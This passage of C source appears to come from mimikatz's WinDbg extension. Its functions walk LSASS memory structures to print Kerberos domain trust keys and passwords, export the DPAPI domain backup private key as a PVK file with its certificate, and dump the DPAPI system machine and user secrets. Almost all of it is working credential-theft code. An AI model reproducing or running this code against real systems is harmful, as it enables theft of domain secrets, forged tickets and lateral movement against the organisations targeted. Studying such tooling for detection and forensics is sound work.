void kuhl_m_sekurlsa_krbtgt_trust(ULONG_PTR addr)
{
	ULONG_PTR buffer;
	KDC_DOMAIN_INFO domainInfo;

	if(ReadMemory(addr, &buffer, sizeof(ULONG_PTR), NULL))
	{
		while(buffer != addr)
		{
			if(ReadMemory(buffer, &domainInfo, sizeof(KDC_DOMAIN_INFO), NULL))
			{
				kuhl_m_sekurlsa_trust_domaininfo(&domainInfo);
				buffer = (ULONG_PTR) domainInfo.list.Flink;
			}
			else break;
		}
	}
}

void kuhl_m_sekurlsa_trust_domainkeys(struct _KDC_DOMAIN_KEYS_INFO * keysInfo, PCSTR prefix, BOOL incoming, PUNICODE_STRING domain)
{
	DWORD i;
	PKDC_DOMAIN_KEYS domainKeys;

	if((keysInfo->keysSize && keysInfo->keys) || (keysInfo->password.Length && keysInfo->password.Buffer))
	{
		dprintf("\n  [%s] ", prefix);
		dprintf(incoming ? "-> %wZ\n" : "%wZ ->\n", domain);

		if(kull_m_string_getDbgUnicodeString(&keysInfo->password))
		{
			dprintf("\tfrom: ");
			if(kull_m_string_suspectUnicodeString(&keysInfo->password))
				dprintf("%wZ", &keysInfo->password);
			else kull_m_string_dprintf_hex(keysInfo->password.Buffer, keysInfo->password.Length, 1);
			LocalFree(keysInfo->password.Buffer);
		}
		dprintf("\n");

		if(keysInfo->keysSize && keysInfo->keys)
		{
			if(domainKeys = (PKDC_DOMAIN_KEYS) LocalAlloc(LPTR, keysInfo->keysSize))
			{
				if(ReadMemory((ULONG_PTR) keysInfo->keys, domainKeys, keysInfo->keysSize, NULL))
				{
					for(i = 0; i < domainKeys->nbKeys; i++)
					{
						dprintf("\t* %s : ", kuhl_m_kerberos_ticket_etype(domainKeys->keys[i].type));
						kull_m_string_dprintf_hex((PBYTE) domainKeys + domainKeys->keys[i].offset, domainKeys->keys[i].size, 0);
						dprintf("\n");
					}
				}
				LocalFree(domainKeys);
			}
		}
	}
}

void kuhl_m_sekurlsa_trust_domaininfo(struct _KDC_DOMAIN_INFO * info)
{
	if(kull_m_string_getDbgUnicodeString(&info->FullDomainName))
	{
		if(kull_m_string_getDbgUnicodeString(&info->NetBiosName))
		{
			dprintf("\nDomain: %wZ (%wZ", &info->FullDomainName, &info->NetBiosName);
			if(kuhl_m_sekurlsa_utils_getSid(&info->DomainSid))
			{
				dprintf(" / "); kull_m_string_displaySID(info->DomainSid);
				LocalFree(info->DomainSid);
			}
			dprintf(")\n");
			kuhl_m_sekurlsa_trust_domainkeys(&info->IncomingAuthenticationKeys, " Out ", FALSE, &info->FullDomainName);	// Input keys are for Out relation ship...
			kuhl_m_sekurlsa_trust_domainkeys(&info->OutgoingAuthenticationKeys, "  In ", TRUE, &info->FullDomainName);
			kuhl_m_sekurlsa_trust_domainkeys(&info->IncomingPreviousAuthenticationKeys, "Out-1", FALSE, &info->FullDomainName);
			kuhl_m_sekurlsa_trust_domainkeys(&info->OutgoingPreviousAuthenticationKeys, " In-1", TRUE, &info->FullDomainName);
			LocalFree(info->NetBiosName.Buffer);
		}
		LocalFree(info->FullDomainName.Buffer);
	}
}
#endif

void kuhl_sekurlsa_dpapi_display_backupkey(ULONG_PTR pGuid, ULONG_PTR pPb, ULONG_PTR pCb, PCSTR text)
{
	GUID guid;
	DWORD cb, szPVK;
	PVOID tmpPtr;
	PKIWI_BACKUP_KEY buffer;
	PVK_FILE_HDR pvkHeader = {PVK_MAGIC, PVK_FILE_VERSION_0, AT_KEYEXCHANGE, PVK_NO_ENCRYPT, 0, 0};
	PBYTE pExport = NULL;

	if(pGuid && pPb && pCb)
	{
		dprintf("%s", text);
		if(ReadMemory(pGuid, &guid, sizeof(GUID), NULL))
			kull_m_string_displayGUID(&guid);
		dprintf("\n");

		if(ReadMemory(pCb, &cb, sizeof(DWORD), NULL) && ReadMemory(pPb, &tmpPtr, sizeof(PVOID), NULL))
		{
			if(cb && tmpPtr)
			{
				if(buffer = (PKIWI_BACKUP_KEY) LocalAlloc(LPTR, cb))
				{
					if(ReadMemory((ULONG_PTR) tmpPtr, buffer, cb, NULL))
					{
						switch(buffer->version)
						{
						case 2:
							dprintf("  * RSA key\n");
							pvkHeader.cbPvk = buffer->keyLen;
							szPVK = sizeof(PVK_FILE_HDR) + pvkHeader.cbPvk ;
							if(pExport = (PBYTE) LocalAlloc(LPTR, szPVK))
							{
								RtlCopyMemory(pExport, &pvkHeader, sizeof(PVK_FILE_HDR));
								RtlCopyMemory(pExport + sizeof(PVK_FILE_HDR), buffer->data, pvkHeader.cbPvk);
								dprintf("\tPVK (private key)\n"); kull_m_string_dprintf_hex(pExport, szPVK, (32 << 16)); dprintf("\n");
								LocalFree(pExport);
							}
							dprintf("\tDER (public key and certificate)\n"); kull_m_string_dprintf_hex(buffer->data + buffer->keyLen, buffer->certLen, (32 << 16)); dprintf("\n");
							break;
						case 1:
							dprintf("  * Legacy key\n");
							kull_m_string_dprintf_hex((PBYTE) buffer + sizeof(DWORD), cb - sizeof(DWORD), (32 << 16));
							dprintf("\n");
							break;
						default:
							dprintf("  * Unknown key (seen as %08x)\n", buffer->version);
							kull_m_string_dprintf_hex((PBYTE) buffer, cb, (32 << 16));
							dprintf("\n");
						}
					}
					LocalFree(buffer);
				}
			}
		}
	}
}

void kuhl_sekurlsa_dpapi_backupkeys()
{
	ULONG_PTR g_fSystemCredsInitialized, g_rgbSystemCredMachine, g_rgbSystemCredUser;
	ULONG_PTR g_guidPreferredKey, g_pbPreferredKey, g_cbPreferredKey, g_guidW2KPreferredKey, g_pbW2KPreferredKey, g_cbW2KPreferredKey;
	BOOL isSystemCredsInitialized;
	BYTE rgbSystemCredMachine[SHA_DIGEST_LENGTH], rgbSystemCredUser[SHA_DIGEST_LENGTH];

	if(NtBuildNumber < KULL_M_WIN_MIN_BUILD_8)
	{
		g_guidPreferredKey = GetExpression("lsasrv!g_guidPreferredKey");
		g_pbPreferredKey = GetExpression("lsasrv!g_pbPreferredKey");
		g_cbPreferredKey = GetExpression("lsasrv!g_cbPreferredKey");
		g_guidW2KPreferredKey = GetExpression("lsasrv!g_guidW2KPreferredKey");
		g_pbW2KPreferredKey = GetExpression("lsasrv!g_pbW2KPreferredKey");
		g_cbW2KPreferredKey = GetExpression("lsasrv!g_cbW2KPreferredKey");

		g_fSystemCredsInitialized = GetExpression("lsasrv!g_fSystemCredsInitialized");
		g_rgbSystemCredMachine = GetExpression("lsasrv!g_rgbSystemCredMachine");
		g_rgbSystemCredUser = GetExpression("lsasrv!g_rgbSystemCredUser");
	}
	else
	{
		g_guidPreferredKey = GetExpression("dpapisrv!g_guidPreferredKey");
		g_pbPreferredKey = GetExpression("dpapisrv!g_pbPreferredKey");
		g_cbPreferredKey = GetExpression("dpapisrv!g_cbPreferredKey");
		g_guidW2KPreferredKey = GetExpression("dpapisrv!g_guidW2KPreferredKey");
		g_pbW2KPreferredKey = GetExpression("dpapisrv!g_pbW2KPreferredKey");
		g_cbW2KPreferredKey = GetExpression("dpapisrv!g_cbW2KPreferredKey");

		g_fSystemCredsInitialized = GetExpression("dpapisrv!g_fSystemCredsInitialized");
		g_rgbSystemCredMachine = GetExpression("dpapisrv!g_rgbSystemCredMachine");
		g_rgbSystemCredUser = GetExpression("dpapisrv!g_rgbSystemCredUser");
	}
	
	if((g_guidPreferredKey && g_pbPreferredKey && g_cbPreferredKey) || (g_guidW2KPreferredKey && g_pbW2KPreferredKey && g_cbW2KPreferredKey))
	{
		dprintf("\nDPAPI Backup keys\n=================\n");
		kuhl_sekurlsa_dpapi_display_backupkey(g_guidPreferredKey, g_pbPreferredKey, g_cbPreferredKey, "Current prefered key:       ");
		kuhl_sekurlsa_dpapi_display_backupkey(g_guidW2KPreferredKey, g_pbW2KPreferredKey, g_cbW2KPreferredKey, "Compatibility prefered key: ");
	}
	
	if(g_fSystemCredsInitialized && g_rgbSystemCredMachine && g_rgbSystemCredUser)
	{
		if(ReadMemory(g_fSystemCredsInitialized, &isSystemCredsInitialized, sizeof(BOOL), NULL))
		{
			dprintf("\nDPAPI System\n============\n");
			if(isSystemCredsInitialized)
			{
				if(
					ReadMemory(g_rgbSystemCredMachine, rgbSystemCredMachine, sizeof(rgbSystemCredMachine), NULL) &&
					ReadMemory(g_rgbSystemCredUser, rgbSystemCredUser, sizeof(rgbSystemCredUser), NULL)
					)
				{
					dprintf("full: ");
					kull_m_string_dprintf_hex(rgbSystemCredMachine, sizeof(rgbSystemCredMachine), 0);
					kull_m_string_dprintf_hex(rgbSystemCredUser, sizeof(rgbSystemCredUser), 0);
					dprintf("\nm/u : ");
					kull_m_string_dprintf_hex(rgbSystemCredMachine, sizeof(rgbSystemCredMachine), 0);
					dprintf(" / ");
					kull_m_string_dprintf_hex(rgbSystemCredUser, sizeof(rgbSystemCredUser), 0);
					dprintf("\n");
				}
			}
		}
	}
}

FARPROC WINAPI delayHookFailureFunc (unsigned int dliNotify, PDelayLoadInfo pdli)
{
    if((dliNotify == dliFailLoadLib) && (_stricmp(pdli->szDll, "bcrypt.dll") == 0))
		RaiseException(ERROR_DLL_NOT_FOUND, 0, 0, NULL);
    return NULL;
}
#ifndef _DELAY_IMP_VER
const
#endif
PfnDliHook __pfnDliFailureHook2 = delayHookFailureFunc;